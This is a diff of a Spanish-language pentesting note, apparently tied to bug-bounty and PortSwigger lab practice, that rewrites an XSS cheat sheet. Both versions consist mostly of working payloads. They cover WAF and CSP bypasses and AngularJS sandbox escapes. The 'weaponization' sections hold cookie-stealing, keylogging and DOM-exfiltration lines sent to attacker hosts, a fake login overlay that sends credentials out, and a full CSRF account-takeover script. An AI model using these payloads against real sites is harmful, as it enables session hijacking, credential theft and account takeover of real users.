@@ -1,345 +1,449 @@
 
----
-Tags: #cybersecurity #pentesting #bugbounty #web-security #owasp-top10 #xss #cross-site-scripting #dom-based #stored-xss #reflected-xss #blind-xss #javascript #payloads #waf-bypass #csp-bypass #angularjs #vuejs #react #jquery #obfuscation #polyglots #weaponization #red-teaming #sink-source #browser-security
+Tags: #WebSecurity #Pentesting #XSS #Payloads #WAFBypass #PortSwigger
 
 ---
 
-## 📑 Índice de Navegación
+## 📑 Índice
 
- [[#1. Anatomía de la Vulnerabilidad Contexto es Rey]]
-	[[#Definición]]
+1. [[#1. Fundamentos Teóricos (Sources & Sinks)]]
+    
+2. [[#2. Fase de Descubrimiento (Fuzzing & Contexto)]]
+    
+3. [[#3. Inyección en Contexto HTML (Tags & Custom)]]
+    
+4. [[#4. Inyección en Atributos y Eventos (Auto-Execution)]]
+    
+5. [[#5. Vectores SVG y XML (Animation & Href Bypass)]]
+    
+6. [[#6. Inyección en Contexto JavaScript (Avanzado)]]
+    
+7. [[#7. Client-Side Template Injection (AngularJS)]]
+    
+8. [[#8. Bypass de WAF y Sanitización]]
+    
+9. [[#9. Bypass de CSP (Content Security Policy)]]
+    
+10. [[#10. Weaponization: Del XSS al Impacto Crítico]]
 	
- [[#2. Matriz de Inyección por Contexto (Cheat Sheet)]]
-    [[#A. Contexto HTML Body (Entre etiquetas)]]
-	[[#B. Contexto Atributos (Dentro de etiquetas)]]
-	[[#C. Contexto JavaScript (Dentro de Script)]]
-	[[#D. Contexto URL / Redirección]]
-	
- [[#3. Explotación DOM Avanzada Sinks y Sources]]
-	[[#Sinks de Ejecución Directa (Code Execution)]]
-	[[#Sinks de HTML (Markup Injection)]]
-	[[#Técnicas de DOM Tricky (Casos Raros)]]
-		[[#1. Inyección dentro de `<select>` (Tu Lab)]]
-		[[#2. jQuery Selector Injection]]
-		
- [[#4. Framework Injection (CSTI & Modern Web)]]
-    [[#AngularJS (Versiones Antiguas & Sandbox)]]
-	[[#Vue.js]]
-	[[#React]]
-	
- [[#5. Evasión de Filtros y WAF (Bypasses)]]
-	[[#A. Codificación (Encoding Hell)]]
-	[[#B. Sin Alfanuméricos (JSFuck / Non-Alpha)]]
-	[[#C. Espacios y Separadores]]
-	[[#D. Polyglots (La llave maestra)]]
-	
-[[#6. Bypass de Controles de Seguridad (CSP)]]
-	[[#1. Dangling Markup (Robo sin Script)]]
-	[[#2. Script Gadgets]]
-	[[#3. Base Tag Injection]]
-	
-[[#7. Weaponization (Impacto Real)]]
-	
-[[#8. Herramientas y Automatización]]
-	
-[[#Referencias]]
-
+11. [[#Referencias]]
 
 ---
 
-## 1. Anatomía de la Vulnerabilidad: Contexto es Rey
-
-### Definición
-
-**[[XSS - Cross-Site Scripting]]** es una vulnerabilidad que permite a un atacante inyectar código JavaScript malicioso en páginas web vistas por otros usuarios. Se explota al reflejar o almacenar contenido no validado que luego se interpreta como código en el navegador de la víctima.
-
-🧠 **Objetivo**: ejecutar código en el navegador de la víctima para robar cookies, secuestrar sesiones, redirigir a sitios maliciosos o hacer keylogging.
-
-
-El error novato es lanzar `<script>alert(1)</script>` a todo. El maestro analiza dónde aterriza el dato.
-
-- **Source (Fuente):** Punto de entrada no confiable (`url`, `cookies`, `storage`, `api response`).
-    
-- **Context (Contexto):** Estado del intérprete cuando lee tu dato (HTML, Atributo, JS, CSS).
-    
-- **Sink (Sumidero):** Función que materializa la ejecución (`innerHTML`, `eval`, `sink`).
-    
-
----
-
-## 2. Matriz de Inyección por Contexto (Cheat Sheet)
-
-### A. Contexto HTML Body (Entre etiquetas)
-
-El input aterriza aquí: `<div> INPUT </div>`
-
-|**Técnica**|**Payload / Código**|**Descripción**|
-|---|---|---|
-|**Script Tag**|`<script>alert(1)</script>`|Bloqueado por el 99% de WAFs.|
-|**Image Vector**|`<img src=x onerror=alert(1)>`|Estándar. Funciona porque la src 'x' falla.|
-|**SVG Vector**|`<svg/onload=alert(1)>`|XML-based. Permite espacios raros para bypass.|
-|**Body/Iframe**|`<iframe src="javascript:alert(1)">`|Ejecución en contexto hijo.|
-|**Details Toggle**|`<details open ontoggle=alert(1)>`|**User Interaction Free.** Se ejecuta al renderizar.|
-|**Input Focus**|`<input onfocus=alert(1) autofocus>`|Se ejecuta instantáneamente al cargar.|
-
-### B. Contexto Atributos (Dentro de etiquetas)
-
-El input aterriza aquí: `<tag atributo="INPUT">`
-
-|**Sub-Contexto**|**Payload**|**Explicación Técnica**|
-|---|---|---|
-|**Salir del Atributo**|`"><script>alert(1)</script>`|Cierras comillas, cierras tag, abres nuevo tag.|
-|**Nuevo Evento**|`" onmouseover="alert(1)`|Inyectas un handler de eventos.|
-|**Atributo `href` / `src`**|`javascript:alert(1)`|Protocol handler. No requiere comillas ni tags.|
-|**Atributo `style`**|`expression(alert(1))`|_Solo IE antiguo_, pero útil en sistemas legacy.|
-|**Canonical Link**|`'accesskey='x'onclick='alert(1)`|Para `<link rel="canonical"...>`. Requiere `Alt+X`.|
-
-### C. Contexto JavaScript (Dentro de Script)
-
-El input aterriza aquí: `<script> var x = 'INPUT'; </script>`
-
-|**Situación**|**Técnica de Escape**|**Payload Completo**|
-|---|---|---|
-|**String Simple**|Romper cadena|`'; alert(1); //`|
-|**Escapado (`\'`)**|Escapar la barra|`\'; alert(1); //` (Browser ve `\\'`)|
-|**Dentro de Bloque**|Cerrar Script|`</script><script>alert(1)</script>`|
-|**Template Literal**|Interpolación|`${alert(1)}` (En backticks `` ` ``)|
-|**JSON Injection**|Polyglot JSON|`"}}'; alert(1); //`|
-
-### D. Contexto URL / Redirección
-
-El input aterriza en un header `Location` o un `window.location`.
-
-- **Data URI:** `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
-    
-- **Javascript Scheme:** `javascript:alert(document.domain)`
-    
-- **VBScript Scheme:** `vbscript:msgbox(1)` (Solo IE antiguo).
-    
-
----
-
-## 3. Explotación DOM Avanzada: Sinks y Sources
-
-DOM XSS ocurre completamente en el cliente. El servidor puede enviar una página segura, pero el JS del cliente la vuelve insegura.
-
-### Sinks de Ejecución Directa (Code Execution)
-
-Estos aceptan texto y lo convierten en código JS.
-
-- `eval(payload)`
-    
-- `setTimeout(payload, 100)`
-    
-- `setInterval(payload, 100)`
-    
-- `new Function(payload)`
-    
-
-### Sinks de HTML (Markup Injection)
-
-Estos parsean HTML. **OJO:** `innerHTML` no ejecuta `<script>` insertados dinámicamente (medida de seguridad de HTML5).
-
-- `element.innerHTML` -> Usa `<img onerror>` o `<svg onload>`.
-    
-- `element.outerHTML`
-    
-- `document.write()` -> **Sí** ejecuta `<script>`.
-    
-- `document.writeln()`
-    
-
-### Técnicas de DOM Tricky (Casos Raros)
-
-#### 1. Inyección dentro de `<select>` (Tu Lab)
-
-El parser de HTML es estricto dentro de un `select`. No puedes poner un `img` dentro de `option`.
-
-- **Mala Sintaxis:** `<select><option><img...></option></select>` (No funciona).
-    
-- **Bypass:** Debes cerrar el select primero.
-    
-- **Payload:** `</option></select><img src=x onerror=alert(1)>`
-    
-
-#### 2. jQuery Selector Injection
-
-Si la app usa `$('location.hash')` o similar.
-
-- **Vuln:** jQuery intenta seleccionar el elemento, pero si le das HTML, lo crea.
-    
-- **Payload:** `https://vuln.com/#<img src=x onerror=alert(1)>`
-    
-
----
-
-## 4. Framework Injection (CSTI & Modern Web)
-
-Cuando inyectas en Vue, React o Angular, no inyectas HTML, inyectas **Plantillas**.
-
-### AngularJS (Versiones Antiguas & Sandbox)
-
-Angular evalúa lo que hay entre `{{ }}`.
-
-- **Basic (1.x sin sandbox):** `{{constructor.constructor('alert(1)')()}}`
-    
-- **Bypass de Sandbox (1.5.x):** Sobreescribir prototipos.
-    
-    JavaScript
-    
-    ```
-    {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
-    ```
-    
-- CSP Bypass: Usar eventos propios de ng.
-    
-    ```js
-	<input ng-focus="$event.view.alert(1)" autofocus>
-    ```
-    
-    
-
-### Vue.js
-
-- **Payload:** `{{_v._s('alert(1)')}}` (Depende de la versión).
-    
-- **Attribute Injection:** `<div v-html="'<img src=x onerror=alert(1)>'"></div>`
-    
-
-### React
-
-React escapa todo por defecto. El XSS ocurre si usan atributos peligrosos:
-
-- `dangerouslySetInnerHTML={{__html: 'INPUT'}}`
-    
-- Inyección en `href` (acepta `javascript:`).
-    
-
----
-
-## 5. Evasión de Filtros y WAF (Bypasses)
-
-Tu payload básico falla. ¿Cómo lo ofuscas?
-
-### A. Codificación (Encoding Hell)
-
-El navegador decodifica en capas (URL -> HTML -> JS).
-
-1. **HTML Decimal:** `<a href="javascript&#58;alert(1)">`
-    
-2. **Hexadecimal:** `<a href="javascript&#x3a;alert(1)">`
-    
-3. **Unicode Escape (JS):** `\u0061lert(1)`
-    
-4. **Octal Escape:** `\141lert(1)`
-    
-
-### B. Sin Alfanuméricos (JSFuck / Non-Alpha)
-
-Ejecutar código sin letras ni números.
-
-- `(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]`... (Esto escribe "a", "b", etc).
-    
-- Herramienta: JSFuck.
-    
-
-### C. Espacios y Separadores
-
-Los WAFs buscan `<img src`.
-
-- `<img/src=x/onerror=alert(1)>` (Usar barras).
-    
-- `<svg/onload=alert(1)>`
-    
-- `<iframe/src="javascript:alert(1)">`
-    
-
-### D. Polyglots (La llave maestra)
-
-Strings diseñados para romper múltiples contextos a la vez. Cópialos y úsalos como primer test.
-
-> **El Polyglot de 0xSobky:**
+> [!INFO] Payloads
 > 
-> JavaScript
+> - Los Payloads son genéricos y en la mayoria de los casos necesitan adaptarse a la lógica de la web víctima.
+>   
+
+## 1. Fundamentos Teóricos (Sources & Sinks)
+
+Para entender cómo romper la lógica, debemos identificar el flujo de datos.
+
+> [!INFO] Conceptos Clave
 > 
-> ```
-> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-> ```
+> - **Source (Fuente):** El origen del dato no confiable bajo control del atacante (ej: `location.search`, `document.referrer`, `cookies`, inputs de formularios).
+>     
+> - **Sink (Sumidero):** La función o elemento del DOM que procesa ese dato de forma insegura, permitiendo la ejecución de script.
+>     
+
+### Tabla de Sinks Comunes
+
+| **Contexto**          | **Sinks Peligrosos**                                               | **Riesgo**                            |
+| --------------------- | ------------------------------------------------------------------ | ------------------------------------- |
+| **Ejecución Directa** | `eval()`, `setTimeout()`, `setInterval()`, `Function()`            | Crítico (RCE en JS)                   |
+| **DOM HTML**          | `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()` | XSS Reflejado/DOM                     |
+| **Navegación**        | `location`, `location.href`, `location.replace()`, `window.open()` | Redirección / `javascript:` execution |
+| **JQuery**            | `$('#target').html()`, `$.parseHTML()`                             | XSS Clásico                           |
 
 ---
 
-## 6. Bypass de Controles de Seguridad (CSP)
+## 2. Fase de Descubrimiento (Fuzzing & Contexto)
 
-**Content Security Policy (CSP)** impide cargar scripts externos o ejecutar inline.
+Antes de lanzar payloads complejos, debemos entender qué caracteres permite el filtro.
 
-### 1. Dangling Markup (Robo sin Script)
+### Fuzzing de Tags y Eventos
 
-Si no puedes ejecutar JS, roba datos cargando recursos incompletos.
+Usamos **Burp Suite Intruder** o **Wfuzz** para identificar qué tags HTML o atributos de eventos no están bloqueados.
 
-- **Payload:** `<img src='https://evil.com/log?key=`
-    
-- **Efecto:** El navegador sigue leyendo el HTML de la página (incluyendo tokens CSRF) hasta encontrar otra comilla `'`, y lo envía todo a tu servidor.
-    
+Herramienta: PortSwigger XSS Cheat Sheet.
 
-### 2. Script Gadgets
+Objetivo: Encontrar un tag (ej: `<details>`) y un evento (ej: ontoggle) que el WAF permita.
 
-Usar librerías legítimas ya cargadas (Bootstrap, jQuery, Angular) para ejecutar código.
+Comando Wfuzz para Contexto JS:
 
-- Si la página permite `unsafe-eval` o `unsafe-inline` en ciertos contextos, usa las funciones de esas librerías para triggerear el XSS.
-    
+Si sospechamos que la inyección está dentro de un string de JS, usamos este comando para ver qué caracteres rompen la sintaxis o se reflejan:
 
-### 3. Base Tag Injection
+```bash
+# Wordlist recomendada: SecLists/Fuzzing/special-chars.txt
+wfuzz -u "https://target.com/post?postId=3FUZZ%27},{x=%27" -w special-chars.txt --hc 404,403
+```
 
-Si bloquean scripts pero puedes inyectar `<base href="https://mi-servidor-malvado.com">`.
-
-- Todos los scripts relativos (`<script src="js/app.js">`) se cargarán desde TU servidor.
+- **Lógica:** Buscamos cambios en el `Content-Length` o códigos de estado que indiquen que nuestro carácter fue interpretado (ej: romper un string con `'` suele causar errores 500 o respuestas distintas).
     
 
 ---
 
-## 7. Weaponization (Impacto Real)
+## 3. Inyección en Contexto HTML (Tags & Custom)
 
-Un `alert(1)` es una PoC. Un reporte crítico demuestra impacto.
+### Payloads Básicos
 
-|**Objetivo**|**Payload JS (Lo que alojas en tu .js externo)**|
-|---|---|
-|**Robo de Sesión**|`location='http://evil.com/?c='+document.cookie;`|
-|**Keylogger**|`document.onkeypress=function(e){fetch('http://evil.com?k='+e.key)}`|
-|**Phishing Overlay**|`document.body.innerHTML='<h1>Loguéate de nuevo</h1><form action=//evil.com>...'`|
-|**Port Scanning**|Usar WebSockets o `fetch` para escanear `192.168.1.X` desde el navegador de la víctima (Intranet hacking).|
-|**Exfiltración DOM**|`fetch('//evil.com', {method:'POST', body:document.documentElement.outerHTML})`|
+
+```html
+<img src=0 onerror=alert(9)>
+
+<img/src=0/onerror=alert(1)>
+```
+
+### Custom Tags (Etiquetas Personalizadas)
+
+Los navegadores modernos permiten definir etiquetas personalizadas. Los WAFs a menudo buscan `<script>` o `<img>` pero ignoran `<xss>`.
+
+
+```html
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+```
+
+- **Explicación:** Creamos una etiqueta `<xss>`. El `tabindex=1` la hace "enfocable". Si añadimos `#x` al final de la URL, el navegador intentará hacer foco en el elemento, disparando `onfocus`.
+    
+
+### Hidden Link & AccessKey (Canonical Exploitation)
+
+Una técnica sigilosa donde inyectamos en etiquetas `<link>` del `head`.
+
+**Escenario Vulnerable:**
+
+
+```html
+<link rel="canonical" href='https://target.com/?x=INYECCION'/>
+```
+
+Payload:
+
+?%27accesskey='x'onclick='alert(1)
+
+Resultado:
+
+```html
+<link rel="canonical" href='https://target.com/?x='accesskey='x'onclick='alert(1)'/>
+```
+
+- **Lógica:** El atributo `accesskey` define un atajo de teclado (Windows: `ALT+SHIFT+X`, Mac: `CTRL+ALT+X`). Aunque el elemento no sea visible, el evento `onclick` se dispara al presionar la combinación. Es útil cuando no podemos inyectar tags nuevos, solo atributos.
+    
 
 ---
 
-## 8. Herramientas y Automatización
+## 4. Inyección en Atributos y Eventos (Auto-Execution)
 
-Para encontrar XSS masivamente.
+El objetivo es lograr la ejecución sin interacción consciente del usuario ("Zero-Click" o interacción forzada).
 
-- **Para buscar parámetros ocultos:** `ParamSpider`, `Arjun`.
+### Iframe + OnLoad + Resize (Interacción Forzada)
+
+Técnica para obligar al navegador a ejecutar el evento `onresize` automáticamente.
+
+```html
+<iframe src="url" onload='this.src + "<script>..."'>
+```
+
+**Payload Avanzado (Auto-Resize):**
+
+```html
+<p id="conelid" tabindex="true" onfocus="alert(1)">Texto Invisible</p>
+<script>
+    // Forzamos un resize o focus automático
+    window.location.hash = "conelid"; 
+</script>
+```
+
+**Variante de PortSwigger (OnResize):**
+
+1. Inyectamos un payload que espera un evento `onresize`.
     
-- **Scanners DAST:** `XSStrike` (Muy bueno para bypass de WAF), `Dalfox` (El estándar actual en Go).
+2. Nuestro script externo carga la página vulnerable en un iframe.
     
-- **Burp Extensions:**
+3. El script cambia el tamaño del iframe (`width`).
     
-    - _DOM Invader:_ (Integrado en el navegador de Burp, brutal para DOM XSS).
+4. El navegador detecta el cambio de tamaño dentro del iframe y dispara el XSS.
+    
+
+### Técnica de Focus Automático (Tabindex)
+
+**Lógica Vulnerable:** Un elemento como `<p>` o `<div>` normalmente no dispara eventos de foco. El atributo `tabindex` le indica al navegador "este elemento puede ser seleccionado con la tecla TAB".
+
+1. **Inyección:** `<p id="triger" tabindex="1" onfocus="alert(1)"></p>`
+    
+2. **Trigger:** Añadimos `/#trigger` a la URL. El navegador hace scroll y foco automáticamente al cargar.
+    
+
+---
+
+## 5. Vectores SVG y XML (Animation & Href Bypass)
+
+SVG (Scalable Vector Graphics) es XML, lo que permite namespaces y comportamientos diferentes al HTML estándar.
+
+### SVG Animation (Bypass de eventos bloqueados)
+
+Si `onload` está bloqueado, usamos animaciones que inician automáticamente.
+
+
+```html
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+```
+
+- **Lógica:** `onbegin` se dispara en cuanto la animación (que no hace nada visualmente) comienza.
+    
+
+### Bypass de Href Bloqueado (Protocolo Javascript)
+
+Si el filtro sanitiza `<a href="javascript:...">` en HTML, podemos intentarlo dentro de un SVG, ya que maneja los enlaces de forma distinta o permite animar el valor del `href`.
+
+**Payload:**
+
+
+```html
+<svg>
+  <a>
+    <animate attributeName="href" values="javascript:alert(1)" />
+    <text x="20" y="20" fill="black">Click</text>
+  </a>
+</svg>
+```
+
+- **Lógica:** No definimos el `href` inicialmente. Usamos `<animate>` para establecer el valor del atributo `href` dinámicamente a `javascript:alert(1)`. El WAF estático no ve el protocolo malicioso en el atributo inicial.
+    
+
+---
+
+## 6. Inyección en Contexto JavaScript (Avanzado)
+
+Uno de los contextos más difíciles. Ocurre dentro de bloques `<script>`.
+
+### Inyección en Fetch (Rompiendo Objetos JS)
+
+**Escenario:**
+
+```javascript
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d3'}).finally(_ => window.location = '/')">
+```
+
+El input se refleja dentro del string `body`.
+
+Payload (URL Encoded):
+
+`postId=3&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'`
+
+**Desglose de la Lógica Vulnerable:**
+
+1. `&'}`: Cierra el string y el objeto de configuración del fetch original.
+    
+2. `,x=x=>{throw/**/onerror=alert,1337}`:
+    
+    - Define una función `x`.
         
-    - _Reflector:_ Te avisa si un parámetro se refleja.
+    - `throw` genera un error intencional.
         
-- **Grep manual (Source Code Review):**
+    - `onerror=alert` captura ese error y ejecuta alert.
+        
+3. `,toString=x`: Sobrescribe la función `toString` del objeto actual para que apunte a nuestra función maliciosa `x`.
     
-    Bash
+4. `,window%2b''`: Intentamos sumar `window` + un string vacío. JS intenta convertir el objeto `window` a string. Esto llama automáticamente a `toString()`, que ahora es nuestra función bomba.
     
-    ```
-    grep -r "innerHTML" .
-    grep -r "document.write" .
-    grep -r "bypassSecurityTrustHtml" . # Angular
-    grep -r "dangerouslySetInnerHTML" . # React
-    ```
+5. `,{x:'`: Abre un nuevo objeto para que el resto del código original (`}).finally...`) no cause un error de sintaxis (SyntaxError) y detenga la ejecución.
     
 
 ---
 
-# Referencias
+## 7. Client-Side Template Injection (AngularJS)
 
-- [CheatSheet de PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
-- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+Explotación de frameworks antiguos (Angular 1.x) que evalúan expresiones en el lado del cliente.
+
+### Sandbox Escape (Angular 1.4.4 - Sin Strings)
+
+Angular tiene un "Sandbox" para evitar que accedas a window o document desde una expresión {{ }}.
+
+Debemos escapar usando prototipos.
+
+Payload:
+
+```js
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+```
+
+**Lógica del Exploit:**
+
+1. `toString().constructor.prototype`: Accedemos al prototipo de String.
+    
+2. `charAt=[].join`: Sobrescribimos `charAt`. Esto rompe la validación interna del sandbox de Angular.
+    
+3. `[1,2]|orderBy:...`: Usamos el filtro `orderBy`, que evalúa expresiones.
+    
+4. `fromCharCode(...)`: Generamos el string `x=alert(1)` sin usar comillas (que podrían estar filtradas), usando códigos ASCII.
+    
+
+### CSP Bypass con Angular (NG-Focus)
+
+Si hay un CSP estricto (`script-src 'self'`) pero se carga Angular, podemos usar Angular para ejecutar código "confiable".
+
+**Payload:**
+
+```JavaScript
+<script>
+  location = 'https://target.com/?search=<input id=x+ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x';
+</script>
+```
+
+- **Mecánica:** Inyectamos HTML. Angular procesa `ng-focus`. Al añadir `#x` a la URL, se fuerza el foco. `orderBy` evalúa nuestra alerta. Como la ejecución la hace Angular (que es un script permitido por el CSP), el navegador lo permite.
+    
+
+---
+
+## 8. Bypass de WAF y Sanitización
+
+Técnicas para evadir filtros de caracteres específicos.
+
+### Tabla de Evasión y Codificación
+
+|**Técnica**|**Payload Original**|**Payload Evasivo**|**Explicación**|
+|---|---|---|---|
+|**Comillas Escapadas**|`';alert(1)//`|`\';alert(1)//`|Si el servidor escapa `'` a `\'`, inyectamos `\` para que sea `\\'` (la barra se escapa a sí misma y la comilla queda libre).|
+|**HTML Entities**|`alert(1)`|`&lpar;1&rpar;`|Útil si `<` o `>` están bloqueados pero se decodifican en el sink.|
+|**Unicode Escapes**|`alert(1)`|`\u0061lert(1)`|Funciona dentro de contexto JS (eval, setTimeout, etc).|
+|**Template Strings**|`alert(1)`|`${alert(1)}`|JS moderno (backticks). Útil si `()` están bloqueados en ciertos contextos.|
+
+Ejemplo Unicode en InnerText:
+
+Si el sink es innerText y usa un framework reactivo:
+
+Payload: ${alert(0)} (A veces interpretado como expresión).
+
+---
+
+## 9. Bypass de CSP (Content Security Policy)
+
+### Policy Injection
+
+Si el parámetro inyectado se refleja en la cabecera de respuesta HTTP.
+
+- Escenario:
+
+URL: /?token=123
+
+Response Header: Content-Security-Policy: report-uri /rep?token=123
+
+- Ataque:
+
+Inyectamos ; para terminar la directiva actual y añadimos una nueva permisiva.
+
+- Payload:
+
+`&token=;script-src-elem 'unsafe-inline'`
+
+Resultado en Header:
+
+... report-uri /rep?token=;script-src-elem 'unsafe-inline'
+
+Esto habilita scripts en línea (<script>alert(1)</script>).
+
+---
+
+## 10. Weaponization: Del XSS al Impacto Crítico
+
+Aquí transformamos una simple alerta en un ataque real.
+
+### 1. Robo de Credenciales (Phishing Overlay)
+
+Inyectamos un formulario falso sobre la página legítima. Como estamos en el dominio real, el usuario confía.
+
+```html
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
+  <h3>Sesión caducada. Por favor, logueate de nuevo:</h3>
+  <input name=username placeholder="Usuario" onchange=fetch("https://oastify.com/?u="+this.value)>
+  <input type=password name=password placeholder="Contraseña" onchange=fetch("https://oastify.com/?p="+this.value)>
+</div>
+```
+
+### 2. Robo de Sesión (Cookies)
+
+```JavaScript
+<script>
+fetch("https://attacker.com/?cookie="+btoa(document.cookie));
+</script>
+```
+
+### 3. CSRF Extremo: Cambio de Email (Account Takeover)
+
+Esta técnica combina XSS para saltarse la protección anti-CSRF.
+
+**Escenario:** Queremos cambiar el email de la víctima, pero hay un token CSRF oculto.
+
+Script de Explotación (Payload JavaScript):
+
+Este script debe ser minificado y entregado vía XSS (ej: eval(atob('BASE64...'))).
+
+```JavaScript
+<script>
+// 1. Fase de Reconocimiento: Obtener el token CSRF legítimo
+var req1 = new XMLHttpRequest();
+// "false" hace la petición Síncrona (espera a que termine para seguir)
+req1.open("GET", "/my-account", false); 
+req1.send();
+
+// Parseamos la respuesta HTML para encontrar el token
+var parser = new DOMParser();
+var doc = parser.parseFromString(req1.responseText, 'text/html');
+// Selector CSS para extraer el value del input hidden
+var csrfToken = doc.querySelector('input[name="csrf"]').value;
+
+// 2. Exfiltrar el token (Opcional, para debug en Burp Collaborator)
+var req2 = new XMLHttpRequest();
+req2.open("GET", "https://collab.oastify.com/?token=" + csrfToken);
+req2.send();
+
+// 3. Fase de Explotación: Lanzar la petición POST forzada
+var req3 = new XMLHttpRequest();
+req3.open("POST", "/my-account/change-email", false);
+// Header indispensable para formularios estándar
+req3.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+// Construimos el cuerpo con el email del atacante y el token robado
+var data = "email=hacker%40evil.com&csrf=" + csrfToken;
+req3.send(data);
+</script>
+```
+
+### 4. CSRF vía HTML Injection (Form Hijacking)
+
+Si no podemos ejecutar JS complejo pero sí inyectar HTML, rompemos el formulario legítimo para capturar el token cuando el usuario haga clic.
+
+Paso 1: Inyección (Link enviado a la víctima)
+
+Inyectamos un cierre de form </form> y abrimos uno nuevo hacia nuestro servidor.
+
+```JavaScript
+// El navegador renderiza el input hidden del token CSRF, pero ahora pertenece a NUESTRO form.
+location='https://target.com/my-account?email=a"></form><form action="https://evil-server.net/exploit" method="GET"><button type="submit">Click me</button>';
+```
+
+Paso 2: Explotación (En nuestro servidor)
+
+Cuando la víctima envía el form, recibimos su token CSRF. Usamos Burp Suite "Generate CSRF PoC" para usar ese token automáticamente:
+
+```html
+<html>
+  <body>
+    <form action="https://target.com/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacker@evil.com" />
+      <input type="hidden" name="csrf" value="TOKEN_ROBADO" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/'); // Oculta la URL para ser sigiloso
+      document.forms[0].submit();     // Envío automático
+    </script>
+  </body>
+</html>
+```
+
+---
+# Referencias:
+
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
+- [XSS Cheat Sheet Portswiger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.4.0---1.4.9)
